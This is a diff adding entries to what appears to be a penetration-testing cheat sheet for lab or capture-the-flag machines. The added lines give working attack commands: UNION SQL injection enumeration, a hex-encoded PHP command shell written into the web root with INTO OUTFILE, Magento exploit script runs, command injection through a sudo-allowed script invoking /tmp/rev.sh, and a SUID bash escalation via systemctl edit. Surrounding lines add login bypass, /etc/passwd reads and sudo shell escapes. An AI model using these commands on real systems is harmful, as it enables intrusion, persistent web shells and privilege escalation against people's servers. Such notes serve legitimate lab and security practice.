@@ -146,6 +146,14 @@ ssh-keygen -y -f $KeyFile
 curl -s -X POST --data-urlencode "username=' || 1=1#" -d "password=anything" -L http://$BoxIP/login.php
 
 # Error, UNION, and time checks
+# Numeric UNION SQLi: map visible columns and enumerate MariaDB metadata
+curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,2,3,4,5,6,7-- -"
+curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -"
+curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='room'-- -"
+# MySQL file write: place a PHP command shell in a writable web root
+curl -G "http://$BoxIP/$Path" --data-urlencode "cod=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4,5,6,7 INTO OUTFILE '/var/www/html/$File'-- -"
+# Magento Shoplift SQLi: manually reproduce the stacked-query admin insert after reviewing the PoC
+python3 $BoxDir/exploits/shoplift_py3.py
 curl -G "http://$BoxIP/$Path" --data-urlencode "id=1'"
 curl -G "http://$BoxIP/$Path" --data-urlencode "id=1' UNION SELECT NULL,NULL-- -"
 time curl -s -X POST "http://$BoxIP/$Path" -d "${Parameter}=1;SELECT SLEEP(5)#"
@@ -214,6 +222,8 @@ sudo tcpdump -ni tun0 "icmp and host $BoxIP"
 curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=ping -c 1 $LocalIP"
 # Test a loopback-only endpoint through a forwarded local port
 curl -G "http://127.0.0.1:$LocalPort/$Path" --data-urlencode "log_file=/etc/passwd;id;#"
+# Bypass an incomplete blacklist with command substitution through a sudo-allowed script
+printf '%s\n' '127.0.0.1\$(bash /tmp/rev.sh)' | sudo -u $Username2 $SudoScript -p
 
 ### Stored browser callbacks
 
@@ -248,6 +258,8 @@ searchsploit -x $ExploitPath
 gcc $Exploit.c -o $Exploit
 # Run a Python proof of concept after reviewing and setting its variables
 python3 $BoxDir/$Exploit.py $BoxIP $Port
+# Authenticated Magento object-injection RCE; validate with an identity command first
+python3 $BoxDir/exploits/magento_rce_py3.py id
 ```
 
 <!-- TODO --> <!-- Add service-specific manual exploit launch commands. -->
@@ -459,6 +471,11 @@ ls -la /tmp/rootbash
 
 ```bash
 # Sudo escape examples
+# SUID systemctl editor path: execute a controlled editor as the retained effective UID
+printf '%s\n' '#!/bin/sh' 'cp /bin/bash /tmp/jarvis-bash' 'chmod 4755 /tmp/jarvis-bash' > /tmp/jarvis-editor.sh
+chmod +x /tmp/jarvis-editor.sh
+script -qc 'SYSTEMD_EDITOR=/tmp/jarvis-editor.sh systemctl edit basic.target' /dev/null 2>&1
+/tmp/jarvis-bash -p -c 'id; whoami'
 sudo find . -exec /bin/sh \; -quit
 sudo python -c 'import pty; pty.spawn("/bin/bash")'
 sudo vim -c ':!/bin/sh'
